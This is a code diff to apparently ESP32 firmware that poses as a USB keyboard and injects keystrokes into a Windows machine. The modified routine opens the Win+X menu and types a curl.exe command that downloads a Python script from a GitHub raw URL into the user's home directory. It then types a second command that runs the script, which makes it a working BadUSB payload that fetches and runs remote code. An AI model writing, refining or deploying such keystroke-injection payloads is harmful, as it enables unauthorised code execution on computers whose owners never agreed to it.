@@ -639,10 +639,10 @@ void notFound(AsyncWebServerRequest *request) {
 class func_rbr_t : public func_base_t {
 
 void start() {
-    USBSerial.begin(115200);
+    USBSerial.begin(9600);
     Keyboard.begin();
     USB.begin();
-    Serial.begin(115200);
+    Serial.begin(9600);
     }
 
     void update(bool btn_click) {
@@ -660,8 +660,10 @@ void start() {
             delay(500);
             Keyboard.print("x");
             delay(500);
-            Keyboard.println("curl.exe --output %homedrive%%HOMEPATH%/script.py --url https://raw.githubusercontent.com/martinhofigueiredo/SSR/main/gitraw.py"); //CURL SCRIPT FROM GIT hub
+            Keyboard.print("curl.exe --output %homedrive%%homepath%\\script.py --url https://raw.githubusercontent.com/martinhofigueiredo/SSR/main/gitraw.py"); //CURL SCRIPT FROM GIT hub
             delay(2000);
+            Keyboard.println();
+            delay(500);
             Keyboard.pressRaw(0xe3); // Left GUI
             Keyboard.pressRaw(0x1B); // Left GUI
             delay(500);
@@ -672,9 +674,10 @@ void start() {
             Keyboard.releaseAll();
             delay(500);
             Keyboard.print("x");
-            delay(500);
-            Keyboard.println("python3 -i %homedrive%%HOMEPATH%/script.py"); //CURL SCRIPT FROM GIT hub
+            delay(1000);
+            Keyboard.print("%homedrive%%homepath%\\script.py"); //CURL SCRIPT FROM GIT hub
             delay(2000);
+            Keyboard.println();
             
             
         }
